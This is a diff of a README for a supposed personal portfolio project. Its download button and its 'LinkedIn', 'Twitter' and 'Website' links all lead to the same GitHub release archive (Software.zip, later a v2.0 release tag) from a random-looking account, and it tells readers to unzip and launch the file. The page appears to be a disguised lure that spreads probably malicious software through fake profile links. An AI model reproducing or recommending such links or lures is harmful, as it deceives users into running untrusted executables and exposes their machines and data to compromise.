@@ -17,7 +17,7 @@ Welcome to my personal portfolio, a project developed to document my journey as 
 
 ## Get Started
 To access the full source code of this portfolio project, please click the button below:
-[![Download Portfolio Project](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
+[![Download Portfolio Project](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/tag/v2.0)](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/tag/v2.0)
 
 If the link above ends with a file name, it needs to be unzipped and launched to view the project.
 
@@ -49,9 +49,9 @@ Feel free to explore the different sections of my portfolio to discover:
 
 ## Connect With Me
 To stay updated on my latest projects and developments, you can connect with me on:
-- [LinkedIn](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
-- [Twitter](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
-- [Website](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
+- [LinkedIn](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/tag/v2.0)
+- [Twitter](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/tag/v2.0)
+- [Website](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/tag/v2.0)
 
 ## Contribute
 If you would like to contribute to my portfolio project or have any suggestions for improvements, feel free to submit a pull request. Your feedback is highly valuable to me, and I appreciate any contributions to enhance this portfolio.
